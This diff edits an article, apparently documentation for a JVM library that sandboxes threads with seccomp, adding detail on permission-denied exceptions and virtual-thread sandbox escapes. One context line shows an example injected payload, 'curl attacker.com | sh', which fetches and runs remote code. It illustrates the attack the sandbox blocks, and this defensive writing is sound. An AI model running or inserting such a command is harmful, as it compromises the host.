@@ -70,7 +70,7 @@ Now consider what happens during a prompt injection attack—where malicious con
 val process = ProcessBuilder("sh", "-c", "curl attacker.com | sh").start()
 ```
 
-Because this runs on a thread in the `webExecutor`, and that thread has subprocess execution blocked at the OS level, the `ProcessBuilder` call throws an `IOException` immediately. The attack stops. The file executor cannot exfiltrate data over the network because `connect` is blocked on its threads.
+Because this runs on a thread in the `webExecutor`, and that thread has subprocess execution blocked at the OS level (and process-wide under Tier 1), the `ProcessBuilder` call fails immediately, throwing a `java.io.IOException: Permission denied` (as the kernel intercepts `execve` and returns `EPERM`). The attack stops. The file executor cannot exfiltrate data over the network because `connect` is blocked on its threads.
 
 No external firewall rules. No container reconfiguration. The policy is declared next to the code that needs it.
 
@@ -94,7 +94,7 @@ ContainedExecutors.installOnProcess(Policy.NO_EXEC)
 
 ### Tier 2: Thread-scoped profiles
 
-This is a policy that applies only to threads inside a specific `ExecutorService`. Other threads in the JVM (like GC, class loading, or unrestricted pools) run normally.
+This is a policy that applies only to threads inside a specific `ExecutorService`. Other threads in the JVM (like GC, class loading, or unrestricted pools) run normally. (For what this means against code-execution attacks and thread-escaping pivots, see the interlude: [Why Would We Do the Same Thing That Failed?](article1b-why-again.md)).
 
 ```kotlin
 // This executor's threads can only do pure computation. No network, no disk writes, no subprocesses.
@@ -129,15 +129,24 @@ val documentPool = ContainedExecutors.wrap(
 )
 ```
 
-The `ExecutorService` interface is unchanged—`submit()`, `invokeAll()`, and `Future` work exactly as before. If you over-restrict and block something a thread legitimately needs, you will see an `IOException` or `SecurityException` during testing.
+The `ExecutorService` interface is unchanged—`submit()`, `invokeAll()`, and `Future` work exactly as before. If you over-restrict and block something a thread legitimately needs, the kernel intercepts the system call and returns a negative error code (usually `EPERM` or `EACCES`), causing the JVM to throw a standard `java.io.IOException` with a message like `"Permission denied"` or `"Operation not permitted"`:
+
+```
+java.io.IOException: Permission denied
+    at java.base/sun.nio.ch.FileDispatcherImpl.open0(Native Method)
+    at java.base/sun.nio.ch.FileDispatcherImpl.open(FileDispatcherImpl.java:319)
+    ...
+```
+
+This keeps debugging straightforward, as it leverages standard Java exception handling.
 
 *Tip: You don't need to guess system calls—mazewall includes an automated profiler that discovers the required syscalls and filesystem paths during your test suite runs. Details in Part 2.*
 
-*Note: Virtual thread and Kotlin coroutine support, as well as carrier thread pinning behaviour, are covered in [Part 3](article3-enforcement.md) and the [README](../../README.md).*
+*Note: Virtual thread and Kotlin coroutine support, as well as carrier thread pinning behaviour, are covered in [Part 3](article3-enforcement.md) and the [README](../../README.md). Note that because virtual threads run on carrier threads, seccomp constraints apply to the carrier thread; if a virtual thread is unpinned and migrates to an unconstrained carrier thread, it may escape the thread-scoped sandbox (which is why Tier 1 process-wide protection is so critical).*
 
 ---
 
-## How to use it correctly: Threat Model & Boundaries
+## How to use it correctly: threat model & boundaries
 
 Thread-scoped sandboxing alone is **not** an absolute security boundary against an attacker with Arbitrary Code Execution (ACE) on the sandboxed thread. Because all JVM threads share the exact same address space and heap, a native memory corruption exploit (e.g., via buffer overflow or unsafe pointer manipulation) on a contained thread could corrupt memory on unrestricted sibling or helper threads to achieve an escape.
 
@@ -176,3 +185,6 @@ fun main() {
 
 **[Part 1: Do You Really Know What Your App Is Doing at Runtime? →](article1-threat-model.md)**
 The case for behavioral security: why knowing what a library *is* is not the same as knowing what it *does* at runtime.
+
+**[Interlude: Why Would We Do the Same Thing That Failed? →](article1b-why-again.md)**
+Confronting the skeptic: why thread-level sandboxing failed historically (e.g. in Chromium) and why JVM type-safety changes the threat model.
